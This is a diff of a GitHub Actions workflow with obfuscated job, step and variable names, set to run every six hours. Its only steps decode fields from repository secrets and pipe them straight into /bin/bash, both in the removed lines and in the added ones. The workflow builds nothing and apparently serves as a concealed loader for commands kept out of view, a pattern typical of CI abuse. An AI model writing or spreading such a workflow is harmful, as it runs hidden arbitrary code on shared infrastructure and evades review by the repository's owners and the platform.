@@ -1,28 +1,20 @@
 name: fuguntang6734
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 4/6 * * *'
-
+    - cron: '40 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fuguntang6734
         env:
-          nsc2350: ${{ secrets.nsc2350 }}
+          q993: ${{ secrets.q993 }}
         run: |
-          echo $nsc2350 | jq -r .h9 | /bin/bash
-          echo $krb14 | jq -r .qyyj31787 | /bin/bash
-          echo $c3 | jq -r .qwtj35963 | /bin/bash
-          echo $q11 | jq -r .cz39010 | /bin/bash
-          echo $ubkux588 | jq -r .htlil5825 | /bin/bash
-          echo $qf7314 | jq -r .pzv39 | /bin/bash
-          echo $an54 | jq -r .gz78 | /bin/bash
-          echo $on0 | jq -r .s4413 | /bin/bash
-          echo $sqz6706 | jq -r .nctda90384 | /bin/bash
-          echo $nxm28 | jq -r .cg61082 | /bin/bash
-          echo $tmoxl2 | jq -r .tmir8988 | /bin/bash
+          echo $q993 | jq -r .zu56795 | /bin/bash
+          echo $lae5939 | jq -r .zslh011 | /bin/bash
+          echo $nda2836 | jq -r .gb242 | /bin/bash
+          echo $zkzlb20205 | jq -r .xijf845 | /bin/bash
 
